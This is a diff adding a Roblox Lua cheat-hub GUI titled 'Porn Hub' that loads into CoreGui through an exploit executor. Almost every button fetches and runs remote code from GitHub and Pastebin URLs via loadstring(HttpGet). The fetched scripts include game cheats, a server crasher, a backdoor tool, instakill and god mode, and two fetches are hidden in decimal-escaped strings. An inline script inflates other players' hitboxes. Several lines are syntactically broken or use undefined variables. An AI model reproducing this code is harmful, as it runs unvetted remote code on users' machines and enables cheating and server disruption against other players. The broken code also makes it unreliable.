@@ -1,0 +1,585 @@
+print("Porn Hub Has Been Launched!")
+
+
+-- Instances:
+
+local ScreenGUI = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local home = Instance.new("TextButton")
+local scripts = Instance.new("TextButton")
+local hubs = Instance.new("TextButton")
+local hometab = Instance.new("Frame")
+local PlayerImage = Instance.new("ImageLabel")
+local welcometxt = Instance.new("TextLabel")
+local madeby = Instance.new("TextLabel")
+local scriptstab = Instance.new("Frame")
+local antiafk = Instance.new("TextButton")
+local keyboard = Instance.new("TextButton")
+local hitbox = Instance.new("TextButton")
+local dahoodfarm = Instance.new("TextButton")
+local buildaboat = Instance.new("TextButton")
+local flygui = Instance.new("TextButton")
+local musclelegend = Instance.new("TextButton")
+local ninjalegendsguis = Instance.new("TextButton")
+local publicbath = Instance.new("TextButton")
+local lumbertycoon2 = Instance.new("TextButton")
+local syntaxv2 = Instance.new("TextButton")
+local prisonlife = Instance.new("TextButton")
+local antifling = Instance.new("TextButton")
+local backdoor = Instance.new("TextButton")
+local brookhaven = Instance.new("TextButton")
+local hubstab = Instance.new("Frame")
+local instakill = Instance.new("TextButton")
+local mm2 = Instance.new("TextButton")
+local psyhub = Instance.new("TextButton")
+local yeetgui = Instance.new("TextButton")
+local droptool = Instance.new("TextButton")
+local koreshub = Instance.new("TextButton")
+local vhub = Instance.new("TextButton")
+local punish gui = Instance.new("TextButton")
+local godmode = Instance.new("TextButton")
+local dahoodartic = Instance.new("TextButton")
+local pineapplehub = Instance.new("TextButton")
+local bar = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGUI.Name = "ScreenGUI"
+ScreenGUI.Parent = game.CoreGui
+ScreenGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = ScreenGUI
+main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+main.Position = UDim2.new(0.288126051, 0, 0.258999169, 0)
+main.Size = UDim2.new(0, 488, 0, 280)
+main.Active = true
+main.Draggable = true
+
+home.Name = "home"
+home.Parent = main
+home.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+home.BorderSizePixel = 0
+home.Position = UDim2.new(0, 0, 0.114285722, 0)
+home.Size = UDim2.new(0, 150, 0, 34)
+home.Font = Enum.Font.Ubuntu
+home.Text = "Home"
+home.TextColor3 = Color3.fromRGB(255, 255, 255)
+home.TextSize = 14.000
+
+scripts.Name = "scripts"
+scripts.Parent = main
+scripts.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+scripts.BorderSizePixel = 0
+scripts.Position = UDim2.new(0.34631148, 0, 0.114285722, 0)
+scripts.Size = UDim2.new(0, 150, 0, 34)
+scripts.Font = Enum.Font.Ubuntu
+scripts.Text = "Scripts"
+scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
+scripts.TextSize = 14.000
+
+hubs.Name = "hubs"
+hubs.Parent = main
+hubs.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+hubs.BorderSizePixel = 0
+hubs.Position = UDim2.new(0.69262296, 0, 0.114285722, 0)
+hubs.Size = UDim2.new(0, 150, 0, 34)
+hubs.Font = Enum.Font.Ubuntu
+hubs.Text = "Hubs"
+hubs.TextColor3 = Color3.fromRGB(255, 255, 255)
+hubs.TextSize = 14.000
+
+hometab.Name = "hometab"
+hometab.Parent = main
+hometab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+hometab.BackgroundTransparency = 1.000
+hometab.Position = UDim2.new(0, 0, 0.235714287, 0)
+hometab.Size = UDim2.new(0, 488, 0, 214)
+hometab.Visible = false
+
+PlayerImage.Name = "PlayerImage"
+PlayerImage.Parent = hometab
+PlayerImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayerImage.BackgroundTransparency = 1.000
+PlayerImage.Position = UDim2.new(0.420081973, 0, 0.0700934529, 0)
+PlayerImage.Size = UDim2.new(0, 78, 0, 62)
+PlayerImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+welcometxt.Name = "welcometxt"
+welcometxt.Parent = hometab
+welcometxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+welcometxt.BackgroundTransparency = 1.000
+welcometxt.BorderSizePixel = 0
+welcometxt.Position = UDim2.new(0.200819671, 0, 0.397196293, 0)
+welcometxt.Size = UDim2.new(0, 291, 0, 50)
+welcometxt.Font = Enum.Font.TitilliumWeb
+welcometxt.Text = "Welcome To Porn Hub!"
+welcometxt.TextColor3 = Color3.fromRGB(255, 255, 255)
+welcometxt.TextScaled = true
+welcometxt.TextSize = 14.000
+welcometxt.TextWrapped = true
+
+madeby.Name = "madeby"
+madeby.Parent = hometab
+madeby.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+madeby.BackgroundTransparency = 1.000
+madeby.BorderSizePixel = 0
+madeby.Position = UDim2.new(0.190573767, 0, 0.598130822, 0)
+madeby.Size = UDim2.new(0, 299, 0, 64)
+madeby.Font = Enum.Font.TitilliumWeb
+madeby.Text = "Porn Hub Was Created By Qwertyuiop#5658"
+madeby.TextColor3 = Color3.fromRGB(255, 255, 255)
+madeby.TextScaled = true
+madeby.TextSize = 14.000
+madeby.TextWrapped = true
+
+scriptstab.Name = "scriptstab"
+scriptstab.Parent = main
+scriptstab.Active = true
+scriptstab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scriptstab.BackgroundTransparency = 1.000
+scriptstab.Position = UDim2.new(0, 0, 0.235714287, 0)
+scriptstab.Size = UDim2.new(0, 488, 0, 214)
+scriptstab.Visible = false
+
+antiafk.Name = "antiafk"
+antiafk.Parent = scriptstab
+antiafk.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+antiafk.Position = UDim2.new(0, 0, 0.0794392526, 0)
+antiafk.Size = UDim2.new(0, 150, 0, 34)
+antiafk.Font = Enum.Font.SourceSans
+antiafk.Text = "Anti Afk"
+antiafk.TextColor3 = Color3.fromRGB(255, 255, 255)
+antiafk.TextSize = 18.000
+antiafk.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
+end)
+
+Keyboard.Name = "Keyboard"
+Keyboard.Parent = scriptstab
+Keyboard.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Keyboard.Position = UDim2.new(0, 0, 0.266355157, 0)
+Keyboard.Size = UDim2.new(0, 150, 0, 34)
+Keyboard.Font = Enum.Font.SourceSans
+Keyboard.Text = "Keyboard"
+Keyboard.TextColor3 = Color3.fromRGB(255, 255, 255)
+Keyboard.TextSize = 18.000
+Keyboard.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/TksXLB78", true))()Keyboarloadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
+end)
+
+hitbox.Name = "hitbox"
+hitbox.Parent = scriptstab
+hitbox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+hitbox.Position = UDim2.new(0, 0, 0.457944006, 0)
+hitbox.Size = UDim2.new(0, 150, 0, 34)
+hitbox.Font = Enum.Font.SourceSans
+hitbox.Text = "HitBox"
+hitbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+hitbox.TextSize = 18.000
+hitbox.MouseButton1Down:connect(function()
+	_G.HeadSize = 20
+	_G.Disabled = true
+
+	game:GetService('RunService').RenderStepped:connect(function()
+		if _G.Disabled then
+			for i,v in next, game:GetService('Players'):GetPlayers() do
+				if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+					pcall(function()
+						v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
+						v.Character.HumanoidRootPart.Transparency = 0.7
+						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
+						v.Character.HumanoidRootPart.Material = "Neon"
+						v.Character.HumanoidRootPart.CanCollide = false
+					end)
+				end
+			end
+		end
+	end)
+end)
+
+dahoodfarm.Name = "dahood farm"
+dahoodfarm.Parent = scriptstab
+dahoodfarm.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+dahoodfarm.Position = UDim2.new(0, 0, 0.658878565, 0)
+dahoodfarm.Size = UDim2.new(0, 150, 0, 34)
+dahoodfarm.Font = Enum.Font.SourceSans
+dahoodfarm.Text = "DaHoodAutoFarm"
+dahoodfarm.TextColor3 = Color3.fromRGB(255, 255, 255)
+petsimx.TextSize = 18.000
+petsimx.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/da%20hood%20farm"))()
+end)
+
+buildaboat.Name = "buildaboat"
+buildaboat.Parent = scriptstab
+buildaboat.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+buildaboat.Position = UDim2.new(0.34631148, 0, 0.079439342, 0)
+buildaboat.Size = UDim2.new(0, 150, 0, 34)
+buildaboat.Font = Enum.Font.SourceSans
+buildaboat.Text = "Build A Boat"
+buildaboat.TextColor3 = Color3.fromRGB(255, 255, 255)
+buildaboat.TextSize = 18.000
+buildaboat.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/BoaHacker/ROBLOX/main/cheat', true))()
+end)
+
+flygui.Name = "flygui"
+flygui.Parent = scriptstab
+flygui.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+flygui.Position = UDim2.new(0.34631148, 0, 0.261682332, 0)
+flygui.Size = UDim2.new(0, 150, 0, 34)
+flygui.Font = Enum.Font.SourceSans
+flygui.Text = "Fly Gui"
+flygui.TextColor3 = Color3.fromRGB(255, 255, 255)
+flygui.TextSize = 18.000
+flygui.MouseButton1Down:connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+end)
+
+musclelegend.Name = "musclelegend"
+musclelegend.Parent = scriptstab
+musclelegend.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+musclelegend.Position = UDim2.new(0.34631148, 0, 0.453271121, 0)
+musclelegend.Size = UDim2.new(0, 150, 0, 34)
+musclelegend.Font = Enum.Font.SourceSans
+musclelegend.Text = "MuscleLegends"
+musclelegend.TextColor3 = Color3.fromRGB(255, 255, 255)
+musclelegend.TextSize = 18.000
+musclelegend.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LOOF-sys/Roblox-Shit/main/MuscleLegends.lua"))()
+end)
+
+ninjalegendsguis.Name = "ninjalegendsguis"
+ninjalegendsguis.Parent = scriptstab
+ninjalegendsguis.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ninjalegendsguis.Position = UDim2.new(0.34631151, 0, 0.658878565, 0)
+ninjalegendsguis.Size = UDim2.new(0, 150, 0, 34)
+ninjalegendsguis.Font = Enum.Font.SourceSans
+ninjalegendsguis.Text = "Ninja Legends"
+ninjalegendsguis.TextColor3 = Color3.fromRGB(255, 255, 255)
+ninjalegendsguis.TextSize = 18.000
+ninjalegendsguis.MouseButton1Down:connect(function()
+	pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2UjrXwTV")))
+end)
+
+publicbath.Name = "publicbath"
+publicbath.Parent = scriptstab
+publicbath.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+publicbath.Position = UDim2.new(0.678278685, 0, 0.0747664422, 0)
+publicbath.Size = UDim2.new(0, 150, 0, 34)
+publicbath.Font = Enum.Font.SourceSans
+publicbath.Text = "PublicBathroom"
+publicbath.TextColor3 = Color3.fromRGB(255, 255, 255)
+publicbath.TextSize = 18.000
+publicbath.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/topitbopit/misc-scripts/main/public_bathroom_crasher.lua'))()
+end)
+
+lumbertycoon2.Name = "lumbertycoon2"
+lumbertycoon2.Parent = scriptstab
+lumbertycoon2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+lumbertycoon2.Position = UDim2.new(0.678278685, 0, 0.261682332, 0)
+lumbertycoon2.Size = UDim2.new(0, 150, 0, 34)
+lumbertycoon2.Font = Enum.Font.SourceSans
+lumbertycoon2.Text = "LumberTycoon2"
+lumbertycoon2.TextColor3 = Color3.fromRGB(255, 255, 255)
+lumbertycoon2.TextSize = 18.000
+lumbertycoon2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://dragondupe.github.io/DragonDupe/BloodV4gU1-obfuscated.lua"))()
+end)
+
+syntaxv2.Name = "syntaxv2"
+syntaxv2.Parent = scriptstab
+syntaxv2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+syntaxv2.Position = UDim2.new(0.678278685, 0, 0.453271121, 0)
+syntaxv2.Size = UDim2.new(0, 150, 0, 34)
+syntaxv2.Font = Enum.Font.SourceSans
+syntaxv2.Text = "SyntaxV2 Pass:Syntaxbesthub"
+syntaxv2.TextColor3 = Color3.fromRGB(255, 255, 255)
+syntaxv2.TextSize = 18.000
+syntaxv2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn'),true))()
+end)
+
+prisonlife.Name = "prisonlife"
+prisonlife.Parent = scriptstab
+prisonlife.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+prisonlife.Position = UDim2.new(0.678278685, 0, 0.658878565, 0)
+prisonlife.Size = UDim2.new(0, 150, 0, 34)
+prisonlife.Font = Enum.Font.SourceSans
+prisonlife.Text = "Prison Life"
+prisonlife.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisonlife.TextSize = 18.000
+prisonlife.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Prision_life_admin_gui%20(1).txt"))()
+end)
+
+antifling.Name = "antifling"
+antifling.Parent = scriptstab
+antifling.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+antifling.Position = UDim2.new(0, 0, 0.836448669, 0)
+antifling.Size = UDim2.new(0, 150, 0, 34)
+antifling.Font = Enum.Font.SourceSans
+antifling.Text = "AntiFling"
+antifling.TextColor3 = Color3.fromRGB(255, 255, 255)
+antifling.TextSize = 18.000
+antifling.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/antifling.txt"))()
+end)
+
+backdoor.Name = "backdoor"
+backdoor.Parent = scriptstab
+backdoor.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+backdoor.Position = UDim2.new(0.34631148, 0, 0.836448669, 0)
+backdoor.Size = UDim2.new(0, 150, 0, 34)
+backdoor.Font = Enum.Font.SourceSans
+backdoor.Text = "Backdoor"
+backdoor.TextColor3 = Color3.fromRGB(255, 255, 255)
+backdoor.TextSize = 18.000
+backdoor.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
+end)
+
+brookhaven.Name = "brookhaven"
+brookhaven.Parent = scriptstab
+brookhaven.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+brookhaven.Position = UDim2.new(0.678278685, 0, 0.836448669, 0)
+brookhaven.Size = UDim2.new(0, 150, 0, 34)
+brookhaven.Font = Enum.Font.SourceSans
+brookhaven.Text = "BrookHaven"
+brookhaven.TextColor3 = Color3.fromRGB(255, 255, 255)
+brookhaven.TextSize = 18.000
+brookhaven.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+end)
+
+
+hubstab.Name = "hubstab"
+hubstab.Parent = main
+hubstab.Active = true
+hubstab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+hubstab.BackgroundTransparency = 1.000
+hubstab.Position = UDim2.new(0, 0, 0.235714287, 0)
+hubstab.Size = UDim2.new(0, 488, 0, 214)
+
+instakill.Name = "instakill"
+instakill.Parent = hubstab
+instakill.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+instakill.Position = UDim2.new(0.0163934417, 0, 0.466850519, 0)
+instakill.Size = UDim2.new(0, 142, 0, 34)
+instakill.Font = Enum.Font.Ubuntu
+instakill.Text = "InstaKill"
+instakill.TextColor3 = Color3.fromRGB(255, 255, 255)
+instakill.TextSize = 14.000
+instakill.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/insta%20kill.txt"))()
+end)
+
+mm2.Name = "mm2"
+mm2.Parent = hubstab
+mm2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+mm2.Position = UDim2.new(0.0143443123, 0, 0.654205739, 0)
+mm2.Size = UDim2.new(0, 142, 0, 34)
+mm2.Font = Enum.Font.SourceSans
+mm2.Text = "MurderMystery2"
+mm2.TextColor3 = Color3.fromRGB(255, 255, 255)
+mm2.TextSize = 18.000
+mm2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/%5BFlowerLily%5D%20Murder%20Mystery%202%20GUI.txt"))()
+end)
+
+psyhub.Name = "psyhub"
+psyhub.Parent = hubstab
+psyhub.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+psyhub.Position = UDim2.new(0.0163934529, 0, 0.261682391, 0)
+psyhub.Size = UDim2.new(0, 142, 0, 34)
+psyhub.Font = Enum.Font.SourceSans
+psyhub.Text = "Psy Hub"
+psyhub.TextColor3 = Color3.fromRGB(255, 255, 255)
+psyhub.TextSize = 18.000
+psyhub.MouseButton1Down:connect(function()
+	loadstring(game:GetObjects("rbxassetid://3014051754")[1].Source)()
+end)
+
+yeetgui.Name = "yeetgui"
+yeetgui.Parent = hubstab
+yeetgui.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+yeetgui.Position = UDim2.new(0.329918057, 0, 0.0747664571, 0)
+yeetgui.Size = UDim2.new(0, 142, 0, 34)
+yeetgui.Font = Enum.Font.SourceSans
+yeetgui.Text = "Yeet Gui"
+yeetgui.TextColor3 = Color3.fromRGB(255, 255, 255)
+yeetgui.TextSize = 18.000
+yeetgui.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Yeet%20Gui.txt"))()
+end)
+
+droptool.Name = "droptool"
+droptool.Parent = hubstab
+droptool.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+droptool.Position = UDim2.new(0.0163934529, 0, 0.0747664869, 0)
+droptool.Size = UDim2.new(0, 141, 0, 34)
+droptool.Font = Enum.Font.SourceSans
+droptool.Text = "Drop Tool"
+droptool.TextColor3 = Color3.fromRGB(255, 255, 255)
+droptool.TextSize = 18.000
+droptool.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Drop%20tool%20gui.txt"))()
+end)
+
+koreshub.Name = "koreshub"
+koreshub.Parent = hubstab
+koreshub.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+koreshub.Position = UDim2.new(0.329918057, 0, 0.261682332, 0)
+koreshub.Size = UDim2.new(0, 142, 0, 34)
+koreshub.Font = Enum.Font.SourceSans
+koreshub.Text = "Kores Hub"
+koreshub.TextColor3 = Color3.fromRGB(255, 255, 255)
+koreshub.TextSize = 18.000
+koreshub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Kores_Hub.txt"))()
+end)
+
+vhub.Name = "vhub"
+vhub.Parent = hubstab
+vhub.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+vhub.Position = UDim2.new(0.329918057, 0, 0.46261692, 0)
+vhub.Size = UDim2.new(0, 142, 0, 34)
+vhub.Font = Enum.Font.SourceSans
+vhub.Text = "VHub"
+vhub.TextColor3 = Color3.fromRGB(255, 255, 255)
+vhub.TextSize = 18.000
+vhub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\52\103\102\114\72\120\52\82'),true))()
+end)
+
+punish gui.Name = "punish gui"
+punish gui.Parent = hubstab
+punish gui.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+punish gui.Position = UDim2.new(0.329918057, 0, 0.65420568, 0)
+punish gui.Size = UDim2.new(0, 142, 0, 34)
+punish gui.Font = Enum.Font.SourceSans
+punish gui.Text = "Punish Gui"
+punish gui.TextColor3 = Color3.fromRGB(255, 255, 255)
+punish gui.TextSize = 18.000
+punish gui.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Punish%20Gui%20(1).txt"))()
+end)
+
+
+godmode.Name = "godmode"
+godmode.Parent = hubstab
+godmode.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+godmode.Position = UDim2.new(0.641393423, 0, 0.0747664273, 0)
+godmode.Size = UDim2.new(0, 162, 0, 34)
+godmode.Font = Enum.Font.SourceSans
+godmode.Text = "God Mode"
+godmode.TextColor3 = Color3.fromRGB(255, 255, 255)
+godmode.TextSize = 18.000
+godmode.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/God%20Gui.txt"))()
+end)
+
+dahoodartic.Name = "dahoodartic"
+dahoodartic.Parent = hubstab
+dahoodartic.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+dahoodartic.Position = UDim2.new(0.641393423, 0, 0.261682332, 0)
+dahoodartic.Size = UDim2.new(0, 162, 0, 34)
+dahoodartic.Font = Enum.Font.SourceSans
+dahoodartic.Text = "Da Hood Artic"
+dahoodartic.TextColor3 = Color3.fromRGB(255, 255, 255)
+dahoodartic.TextSize = 18.000
+dahoodartic.MouseButton1Down:connect(function()
+	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/PolarWasHere/Arctic/main/Arctic"))()
+end)
+
+pineapplehub.Name = "pineapplehub"
+pineapplehub.Parent = hubstab
+pineapplehub.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+pineapplehub.Position = UDim2.new(0.641393423, 0, 0.46261692, 0)
+pineapplehub.Size = UDim2.new(0, 162, 0, 34)
+pineapplehub.Font = Enum.Font.SourceSans
+pineapplehub.Text = "PineApple Hub"
+pineapplehub.TextColor3 = Color3.fromRGB(255, 255, 255)
+pineapplehub.TextSize = 18.000
+pineapplehub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/MirayXS/Aux/main/Pineapple.lua"), true))()
+end)
+
+bar.Name = "bar"
+bar.Parent = main
+bar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+bar.Size = UDim2.new(0, 488, 0, 26)
+
+TextLabel.Parent = main
+TextLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0163934417, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 93, 0, 26)
+TextLabel.Font = Enum.Font.Ubuntu
+TextLabel.Text = "Porn Hub v1.0 "
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+-- Scripts:
+
+local function LDLMGWH_fake_script() -- home.LocalScript 
+	local script = Instance.new('LocalScript', home)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.hometab.Visible = true
+		script.Parent.Parent.scriptstab.Visible = false
+		script.Parent.Parent.hubstab.Visible = false
+	end)
+end
+coroutine.wrap(LDLMGWH_fake_script)()
+local function OJTG_fake_script() -- scripts.LocalScript 
+	local script = Instance.new('LocalScript', scripts)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.scriptstab.Visible = true
+		script.Parent.Parent.hometab.Visible = false
+		script.Parent.Parent.hubstab.Visible = false
+	end)
+end
+coroutine.wrap(OJTG_fake_script)()
+local function ASEUYNU_fake_script() -- hubs.LocalScript 
+	local script = Instance.new('LocalScript', hubs)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.hubstab.Visible = true
+		script.Parent.Parent.scriptstab.Visible = false
+		script.Parent.Parent.hometab.Visible = false
+	end)
+end
+coroutine.wrap(ASEUYNU_fake_script)()
+local function GBKPG_fake_script() -- hometab.LocalScript 
+	local script = Instance.new('LocalScript', hometab)
+
+	local frame = script.Parent
+	
+	
+	
+	local player = game.Players.LocalPlayer
+	
+	
+	
+	local userId = player.UserId
+	
+	local thumbType = Enum.ThumbnailType.AvatarBust
+	
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	
+	local content, isReady = game.Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+	
+	
+	
+	
+	
+	frame.PlayerImage.Image = content
+	
+end
+coroutine.wrap(GBKPG_fake_script)()
